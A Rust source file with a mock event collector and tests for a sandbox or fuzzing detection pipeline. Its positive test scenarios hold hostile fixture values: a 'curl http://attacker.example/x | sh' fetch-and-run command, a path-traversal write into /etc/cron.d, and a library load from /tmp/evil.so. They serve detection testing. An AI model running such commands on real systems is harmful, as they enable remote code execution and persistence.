// SPDX-License-Identifier: Apache-2.0

//! A dependency-free mock collector that speaks the `bhf.collector-event.v1`
//! wire protocol.
//!
//! The mock is the always-on, every-platform proof that the contract is real:
//! it emits the exact JSONL a provider would, which a host parses back through
//! the same [`crate::session`] reader. It exercises the whole pipeline —
//! schema, session grouping, attribution, normalization, oracle mapping, and
//! fidelity — with no subprocess and no OS tracer, so a Linux CI runner can
//! stand in for a live provider. The out-of-process sidecar harness that drives
//! a *real* external provider lives on the host side and is wired up separately.

use crate::collector::{BackendInfo, Collector, CollectorContext, CollectorError};
use crate::schema::{CollectorEvent, EventKind, EventPhase, Fidelity, ProcessIdentity};

/// One effect the mock replays while a testcase "runs".
#[derive(Debug, Clone)]
pub struct MockEffect {
    pub kind: EventKind,
    pub pid: u32,
    pub parent: Option<u32>,
    pub ancestor: Option<u32>,
    pub image: Option<String>,
    pub path: Option<String>,
    pub args: Vec<String>,
    pub verb: Option<String>,
    pub address: Option<String>,
    pub input_derived: bool,
    pub taint_offset: Option<u32>,
    /// Timestamp offset from the testcase start, in seconds.
    pub ts_offset: f64,
}

impl MockEffect {
    fn child(kind: EventKind, pid: u32, root_pid: u32, ts_offset: f64) -> Self {
        MockEffect {
            kind,
            pid,
            parent: Some(root_pid),
            ancestor: Some(root_pid),
            image: None,
            path: None,
            args: Vec::new(),
            verb: None,
            address: None,
            input_derived: false,
            taint_offset: None,
            ts_offset,
        }
    }
}

/// A scripted collector that renders a canned testcase observation into the
/// collector JSONL wire format.
#[derive(Debug, Clone)]
pub struct MockCollector {
    backend: BackendInfo,
    root_pid: u32,
    root_image: String,
    start_ts: f64,
    end_ts: f64,
    effects: Vec<MockEffect>,
    fidelity: Fidelity,
}

impl MockCollector {
    /// An empty mock rooted at `root_pid`.
    pub fn new(root_pid: u32, root_image: impl Into<String>) -> Self {
        MockCollector {
            backend: BackendInfo::new("mock", env!("CARGO_PKG_VERSION"), ""),
            root_pid,
            root_image: root_image.into(),
            start_ts: 1_000.0,
            end_ts: 1_010.0,
            effects: Vec::new(),
            fidelity: Fidelity::default(),
        }
    }

    /// Append an effect.
    pub fn with_effect(mut self, effect: MockEffect) -> Self {
        self.effects.push(effect);
        self
    }

    /// Set the fidelity the provider reports on the `end` boundary (loss,
    /// unsupported fields, permission denial).
    pub fn with_fidelity(mut self, fidelity: Fidelity) -> Self {
        self.fidelity = fidelity;
        self
    }

    /// Positive scenario #1: a fuzz-controlled process execution (an
    /// `input_derived` shell command launched by a direct child).
    pub fn process_exec() -> Self {
        let mut effect = MockEffect::child(EventKind::ShellExecute, 1001, 1000, 1.0);
        effect.image = Some("/bin/sh".into());
        effect.verb = Some("exec".into());
        effect.args = vec!["-c".into(), "curl http://attacker.example/x | sh".into()];
        effect.input_derived = true;
        effect.taint_offset = Some(0);
        MockCollector::new(1000, "/srv/sandbox/target").with_effect(effect)
    }

    /// Positive scenario #2: a fuzz-controlled filesystem path escaping the
    /// allowed root.
    pub fn path_control() -> Self {
        let mut effect = MockEffect::child(EventKind::FileWrite, 1001, 1000, 1.0);
        effect.path = Some("../../etc/cron.d/payload".into());
        effect.input_derived = true;
        effect.taint_offset = Some(4);
        MockCollector::new(1000, "/srv/sandbox/target").with_effect(effect)
    }

    /// Positive scenario #3: a fuzz-controlled dynamic-library load from an
    /// attacker-writable location.
    pub fn controlled_library_load() -> Self {
        let mut effect = MockEffect::child(EventKind::ModuleLoad, 1001, 1000, 1.0);
        effect.path = Some("/tmp/evil.so".into());
        effect.input_derived = true;
        effect.taint_offset = Some(8);
        MockCollector::new(1000, "/srv/sandbox/target").with_effect(effect)
    }

    /// Negative control: the same effect shapes, but fixed constants the target
    /// always performs (`input_derived == false`), which must never be
    /// taint-confirmed.
    pub fn fixed_constants() -> Self {
        let mut exec = MockEffect::child(EventKind::ShellExecute, 1001, 1000, 1.0);
        exec.image = Some("/bin/ls".into());
        exec.args = vec!["-la".into()];

        let mut write = MockEffect::child(EventKind::FileWrite, 1001, 1000, 2.0);
        write.path = Some("data/output.bin".into());

        let mut load = MockEffect::child(EventKind::ModuleLoad, 1001, 1000, 3.0);
        load.path = Some("/usr/lib/x86_64-linux-gnu/libc.so.6".into());

        MockCollector::new(1000, "/srv/sandbox/target")
            .with_effect(exec)
            .with_effect(write)
            .with_effect(load)
    }

    /// Render the begin/effect/end events for a context into [`CollectorEvent`]s.
    pub fn events(&self, ctx: &CollectorContext) -> Vec<CollectorEvent> {
        let mut out = Vec::with_capacity(self.effects.len() + 2);
        let mut seq = 0u64;

        let mut begin = CollectorEvent::new(
            &ctx.testcase,
            ctx.worker,
            seq,
            EventPhase::Begin,
            EventKind::ProcessCreate,
        );
        begin.process = ProcessIdentity {
            pid: self.root_pid,
            image: Some(self.root_image.clone()),
            session: Some(1),
            ..Default::default()
        };
        begin.ts = Some(self.start_ts);
        begin.evidence_ref = Some(format!("mock:{}", self.root_pid));
        out.push(begin);

        for effect in &self.effects {
            seq += 1;
            let mut ev = CollectorEvent::new(
                &ctx.testcase,
                ctx.worker,
                seq,
                EventPhase::Event,
                effect.kind.clone(),
            );
            ev.process = ProcessIdentity {
                pid: effect.pid,
                image: effect.image.clone(),
                parent: effect.parent,
                ancestor: effect.ancestor.or(Some(self.root_pid)),
                session: Some(1),
                ..Default::default()
            };
            ev.path = effect.path.clone();
            ev.args = effect.args.clone();
            ev.verb = effect.verb.clone();
            ev.address = effect.address.clone();
            ev.input_derived = effect.input_derived;
            ev.taint_offset = effect.taint_offset;
            ev.ts = Some(self.start_ts + effect.ts_offset);
            ev.evidence_ref = Some(format!("mock:{seq}"));
            out.push(ev);
        }

        seq += 1;
        let mut end = CollectorEvent::new(
            &ctx.testcase,
            ctx.worker,
            seq,
            EventPhase::End,
            EventKind::ProcessCreate,
        );
        end.process = ProcessIdentity {
            pid: self.root_pid,
            ..Default::default()
        };
        end.ts = Some(self.end_ts);
        end.fidelity = self.fidelity.clone();
        out.push(end);

        out
    }
}

impl Collector for MockCollector {
    fn backend(&self) -> BackendInfo {
        self.backend.clone()
    }

    fn observe(&self, ctx: &CollectorContext) -> Result<String, CollectorError> {
        let mut lines = String::new();
        for ev in self.events(ctx) {
            lines.push_str(&ev.to_jsonl_line());
            lines.push('\n');
        }
        Ok(lines)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::attribute::attribute;
    use crate::oracle_map::to_oracle_event;
    use crate::session::CollectorSessionSet;
    use finding_rules::oracle_registry::ORACLE_REGISTRY;

    const ROOT: &str = "/srv/sandbox";

    fn ctx(worker: u32) -> CollectorContext {
        CollectorContext::new("tc-1", worker, ROOT, 250)
    }

    fn registry_hits(mock: &MockCollector) -> Vec<String> {
        let set = mock.observe_sessions(&ctx(0)).unwrap();
        let session = set.session("tc-1", 0).expect("session present");
        let attributed = attribute(session, 250);
        let mut names = Vec::new();
        for ev in &attributed.attributed {
            if let Some(oracle_ev) = to_oracle_event(ev, ROOT) {
                for oracle in ORACLE_REGISTRY.iter() {
                    if let Some(hit) = oracle.evaluate(&oracle_ev) {
                        names.push(hit.oracle_name);
                    }
                }
            }
        }
        names
    }

    #[test]
    fn process_exec_emits_tainted_command_finding() {
        let hits = registry_hits(&MockCollector::process_exec());
        assert!(
            hits.iter().any(|n| n == "command-controlled-runtime"),
            "process-exec scenario must produce a controlled-command finding; got {hits:?}"
        );
    }

    #[test]
    fn path_control_emits_path_controlled_finding() {
        let hits = registry_hits(&MockCollector::path_control());
        assert!(
            hits.iter().any(|n| n == "path-controlled-open-runtime"),
            "path-control scenario must produce a path-controlled finding; got {hits:?}"
        );
    }

    #[test]
    fn controlled_library_load_emits_library_finding() {
        let hits = registry_hits(&MockCollector::controlled_library_load());
        assert!(
            hits.iter().any(|n| n == "library-load-controlled-runtime"),
            "library-load scenario must produce a controlled-library finding; got {hits:?}"
        );
    }

    #[test]
    fn fixed_constants_are_not_taint_confirmed() {
        let hits = registry_hits(&MockCollector::fixed_constants());
        for taint_oracle in [
            "command-controlled-runtime",
            "path-controlled-open-runtime",
            "library-load-controlled-runtime",
        ] {
            assert!(
                !hits.iter().any(|n| n == taint_oracle),
                "fixed constants must never be taint-confirmed, but {taint_oracle} fired"
            );
        }
    }

    #[test]
    fn direct_child_effect_attributed_to_testcase() {
        let mock = MockCollector::process_exec();
        let set = mock.observe_sessions(&ctx(0)).unwrap();
        let session = set.session("tc-1", 0).unwrap();
        let attributed = attribute(session, 250);
        assert_eq!(attributed.root_pid, Some(1000));
        assert!(attributed.tree_pids.contains(&1001));
        assert!(attributed
            .attributed
            .iter()
            .any(|e| e.process.pid == 1001 && e.kind == EventKind::ShellExecute));
    }

    #[test]
    fn concurrent_workers_stay_isolated() {
        // Same testcase observed on two workers with overlapping pids.
        let mock = MockCollector::path_control();
        let mut stream = mock.observe(&ctx(0)).unwrap();
        stream.push_str(&mock.observe(&ctx(1)).unwrap());

        let set = CollectorSessionSet::from_jsonl(&stream);
        let w0 = set.session("tc-1", 0).unwrap();
        let w1 = set.session("tc-1", 1).unwrap();
        assert!(w0.events.iter().all(|e| e.worker == 0));
        assert!(w1.events.iter().all(|e| e.worker == 1));
        // Attribution of each worker is self-contained despite pid overlap.
        assert_eq!(attribute(w0, 250).root_pid, Some(1000));
        assert_eq!(attribute(w1, 250).root_pid, Some(1000));
    }

    #[test]
    fn lossy_run_is_not_reported_clean() {
        let mock = MockCollector::process_exec().with_fidelity(Fidelity {
            lost: 2,
            permission_denied: true,
            unsupported_fields: vec!["process.token".into()],
        });
        let set = mock.observe_sessions(&ctx(0)).unwrap();
        let session = set.session("tc-1", 0).unwrap();
        assert!(
            !session.clean_assurance_ok(),
            "a lossy/permission-denied run must never be reported clean"
        );
        assert_eq!(session.fidelity.lost, 2);
        assert!(session.fidelity.permission_denied);
    }

    #[test]
    fn emitted_stream_is_well_formed_jsonl() {
        let stream = MockCollector::process_exec().observe(&ctx(0)).unwrap();
        for line in stream.lines() {
            let _: CollectorEvent =
                serde_json::from_str(line).expect("every mock line is valid schema");
        }
    }
}
